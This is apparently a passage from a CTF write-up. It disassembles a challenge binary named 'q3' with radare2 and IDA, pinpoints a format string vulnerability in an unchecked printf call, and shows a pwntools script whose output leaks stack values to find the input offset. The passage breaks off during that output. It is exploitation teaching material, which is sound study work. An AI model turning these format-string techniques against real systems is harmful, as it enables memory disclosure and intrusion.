<h3 id="analysing-the-binary" class="relative group">Analysing the binary <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analysing-the-binary" aria-label="Anchor">#</a></span></h3><p>Let&rsquo;s analyse or reverse enginner the binary first, I&rsquo;ll be using radare2 for disassembly and IDA Pro for decompiled functions:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~</span><span class="nf">$</span> <span class="no">r2</span> <span class="p">-</span><span class="no">AAAA</span> <span class="no">q3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span><span class="nf">snip--</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[0</span><span class="nf">x00000670</span><span class="p">]</span><span class="err">&gt;</span> <span class="no">afl</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000</span>    <span class="mi">3</span> <span class="mi">72</span>   <span class="p">-</span><span class="err">&gt;</span> <span class="mi">73</span>   <span class="no">sym.imp.__libc_start_main</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000005f8</span>    <span class="mi">3</span> <span class="mi">23</span>           <span class="no">sym._init</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000620</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sym.imp.puts</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000630</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sym.imp.__stack_chk_fail</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000640</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sym.imp.printf</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000650</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sym.imp.fgets</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000660</span>    <span class="mi">1</span> <span class="mi">6</span>            <span class="no">sub.__cxa_finalize_248_660</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000670</span>    <span class="mi">1</span> <span class="mi">43</span>           <span class="no">entry0</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000006a0</span>    <span class="mi">4</span> <span class="mi">50</span>   <span class="p">-</span><span class="err">&gt;</span> <span class="mi">40</span>   <span class="no">sym.deregister_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000006e0</span>    <span class="mi">4</span> <span class="mi">66</span>   <span class="p">-</span><span class="err">&gt;</span> <span class="mi">57</span>   <span class="no">sym.register_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000730</span>    <span class="mi">4</span> <span class="mi">49</span>           <span class="no">sym.__do_global_dtors_aux</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000770</span>    <span class="mi">1</span> <span class="mi">10</span>           <span class="no">entry1.init</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000077a</span>    <span class="mi">3</span> <span class="mi">182</span>          <span class="no">sym.main</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000830</span>    <span class="mi">4</span> <span class="mi">101</span>          <span class="no">sym.__libc_csu_init</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000008a0</span>    <span class="mi">1</span> <span class="mi">2</span>            <span class="no">sym.__libc_csu_fini</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000008a4</span>    <span class="mi">1</span> <span class="mi">9</span>            <span class="no">sym._fini</span>
</span></span></code></pre></div><p>No special function is seen here, let&rsquo;s disassemble <code>main</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[0</span><span class="nf">x00000670</span><span class="p">]</span><span class="err">&gt;</span> <span class="no">pdf</span> <span class="err">@</span><span class="no">main</span>
</span></span><span class="line"><span class="cl">            <span class="c1">;-- main:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.main</span> <span class="mi">182</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>   <span class="nf">sym.main</span> <span class="p">()</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="c1">; var FILE local_28h @ rbp-0x28
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="c1">; var int local_20h @ rbp-0x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="c1">; var int local_18h @ rbp-0x18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="c1">; var int local_8h @ rbp-0x8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>              <span class="c1">; DATA XREF from 0x0000068d (entry0)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000077a</span>      <span class="mi">55</span>             <span class="no">push</span> <span class="no">rbp</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000077b</span>      <span class="mi">4889</span><span class="no">e5</span>         <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000077e</span>      <span class="mi">4883</span><span class="no">ec30</span>       <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x30</span>               <span class="c1">; &#39;0&#39;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000782</span>      <span class="mi">64488</span><span class="no">b042528.</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0x28</span><span class="p">]</span>    <span class="c1">; [0x28:8]=0x19e0 ; &#39;(&#39;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000078b</span>      <span class="mi">488945</span><span class="no">f8</span>       <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_8h</span><span class="p">],</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000078f</span>      <span class="mi">31</span><span class="no">c0</span>           <span class="no">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000791</span>      <span class="mi">48</span><span class="no">c745e00000.</span>  <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_20h</span><span class="p">],</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000799</span>      <span class="mi">48</span><span class="no">c745e80000.</span>  <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_18h</span><span class="p">],</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007a1</span>      <span class="mi">488</span><span class="no">b05680820.</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">obj.stdin</span><span class="p">]</span>  <span class="c1">; loc.stdin ; [0x201010:8]=0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007a8</span>      <span class="mi">488945</span><span class="no">d8</span>       <span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_28h</span><span class="p">],</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007ac</span>      <span class="mi">488</span><span class="no">d3d010100.</span>  <span class="no">lea</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">qword</span> <span class="no">str.Enter_name_</span><span class="p">:</span> <span class="c1">; 0x8b4 ; &#34;Enter name : &#34; ; const char * format
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007b3</span>      <span class="no">b800000000</span>     <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007b8</span>      <span class="no">e883feffff</span>     <span class="no">call</span> <span class="no">sym.imp.printf</span>         <span class="c1">; int printf(const char *format)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007bd</span>      <span class="mi">488</span><span class="no">b55d8</span>       <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_28h</span><span class="p">]</span>  <span class="c1">; FILE *stream
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007c1</span>      <span class="mi">488</span><span class="no">d45e0</span>       <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_20h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007c5</span>      <span class="no">be10000000</span>     <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x10</span>               <span class="c1">; int size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007ca</span>      <span class="mi">4889</span><span class="no">c7</span>         <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>                <span class="c1">; char *s
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007cd</span>      <span class="no">e87efeffff</span>     <span class="no">call</span> <span class="no">sym.imp.fgets</span>          <span class="c1">; char *fgets(char *s, int size, FILE *stream)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007d2</span>      <span class="mi">488</span><span class="no">d3de90000.</span>  <span class="no">lea</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">qword</span> <span class="no">str.Hello</span>    <span class="c1">; 0x8c2 ; &#34;Hello&#34; ; const char * s
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007d9</span>      <span class="no">e842feffff</span>     <span class="no">call</span> <span class="no">sym.imp.puts</span>           <span class="c1">; int puts(const char *s)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007de</span>      <span class="mi">488</span><span class="no">d45e0</span>       <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_20h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007e2</span>      <span class="mi">4889</span><span class="no">c7</span>         <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>                <span class="c1">; const char * format
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007e5</span>      <span class="no">b800000000</span>     <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007ea</span>      <span class="no">e851feffff</span>     <span class="no">call</span> <span class="no">sym.imp.printf</span>         <span class="c1">; int printf(const char *format)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007ef</span>      <span class="mi">488</span><span class="no">d3dd20000.</span>  <span class="no">lea</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">qword</span> <span class="no">str.Enter_sentence_</span><span class="p">:</span> <span class="c1">; 0x8c8 ; &#34;Enter sentence : &#34; ; const char * format
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007f6</span>      <span class="no">b800000000</span>     <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x000007fb</span>      <span class="no">e840feffff</span>     <span class="no">call</span> <span class="no">sym.imp.printf</span>         <span class="c1">; int printf(const char *format)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000800</span>      <span class="mi">488</span><span class="no">b55d8</span>       <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_28h</span><span class="p">]</span>  <span class="c1">; FILE *stream
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000804</span>      <span class="mi">488</span><span class="no">d45e0</span>       <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_20h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000808</span>      <span class="no">be00010000</span>     <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x100</span>              <span class="c1">; int size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000080d</span>      <span class="mi">4889</span><span class="no">c7</span>         <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>                <span class="c1">; char *s
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000810</span>      <span class="no">e83bfeffff</span>     <span class="no">call</span> <span class="no">sym.imp.fgets</span>          <span class="c1">; char *fgets(char *s, int size, FILE *stream)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000815</span>      <span class="no">b800000000</span>     <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000081a</span>      <span class="mi">488</span><span class="no">b4df8</span>       <span class="no">mov</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_8h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>           <span class="err">0</span><span class="nf">x0000081e</span>      <span class="mi">6448330</span><span class="no">c2528.</span>  <span class="no">xor</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>       <span class="err">,=&lt;</span> <span class="err">0</span><span class="nf">x00000827</span>      <span class="mi">7405</span>           <span class="no">je</span> <span class="mi">0x82e</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>       <span class="err">|</span>   <span class="err">0</span><span class="nf">x00000829</span>      <span class="no">e802feffff</span>     <span class="no">call</span> <span class="no">sym.imp.__stack_chk_fail</span> <span class="c1">; void __stack_chk_fail(void)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>       <span class="err">|</span>      <span class="c1">; JMP XREF from 0x00000827 (sym.main)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>       <span class="err">`-&gt;</span> <span class="err">0</span><span class="nf">x0000082e</span>      <span class="no">c9</span>             <span class="no">leave</span>
</span></span><span class="line"><span class="cl"><span class="err">\</span>           <span class="err">0</span><span class="nf">x0000082f</span>      <span class="no">c3</span>             <span class="no">ret</span>
</span></span></code></pre></div><p>First input is getting printed and as you can see at line <code> 0x000007d2      488d3de90000.  lea rdi, qword str.Hello    ; 0x8c2 ; &quot;Hello&quot; ; const char * s</code> there&rsquo;s no specifier at the commented string otherwise radare2 would&rsquo;ve been able to show it. And since it&rsquo;s getting printed with <code> 0x000007ea      e851feffff     call sym.imp.printf         ; int printf(const char *format)</code> instruction we know where the format string vulerability is.</p>
<p>For ease of understanding, we have a decompiled function with the help of IDA:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// ST08_8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-20h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">stream</span> <span class="o">=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">_bss_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter name : &#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">16LL</span><span class="p">);</span>  <span class="o">&lt;--</span> <span class="n">Here</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">the</span> <span class="n">vulnerability</span><span class="p">,</span> <span class="n">just</span> <span class="n">like</span> <span class="n">in</span> <span class="n">that</span> <span class="n">example</span><span class="p">,</span> <span class="n">isn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">it</span><span class="o">?</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter sentence : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h3 id="exploiting-the-binary" class="relative group">Exploiting the binary <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-the-binary" aria-label="Anchor">#</a></span></h3><p>So, let&rsquo;s make a script to find the offset for the input on stack, who knows we might be able to get something of interest?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./q3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;AAAA %</span><span class="si">{}</span><span class="s2">$lx&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="c1"># will print the stack data in hex format</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># Hello</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span> <span class="n">i</span><span class="p">,</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>Let&rsquo;s run it:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs</span><span class="err">/</span><span class="no">Defcamp$</span> <span class="no">python</span> <span class="no">find_off.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8323</span>
</span></span><span class="line"><span class="cl"><span class="err">2</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7dd18c0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8325</span>
</span></span><span class="line"><span class="cl"><span class="err">3</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7af4154</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8325</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8327</span>
</span></span><span class="line"><span class="cl"><span class="err">4</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7fd24c0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8327</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8329</span>
</span></span><span class="line"><span class="cl"><span class="err">5</span> <span class="nf">AAAA</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8329</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8331</span>
</span></span><span class="line"><span class="cl"><span class="err">6</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7de59a0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8331</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8333</span>
</span></span><span class="line"><span class="cl"><span class="err">7</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7dcfa00</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8333</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8335</span>
</span></span><span class="line"><span class="cl"><span class="err">8</span> <span class="nf">AAAA</span> <span class="mi">2438252041414141</span>                                        <span class="err">&lt;</span><span class="p">---</span> <span class="no">Offset</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8335</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8337</span>
</span></span><span class="line"><span class="cl"><span class="err">9</span> <span class="nf">AAAA</span> <span class="no">a786c</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8337</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8339</span>
</span></span><span class="line"><span class="cl"><span class="err">10</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">fffffffde80</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8339</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8341</span>
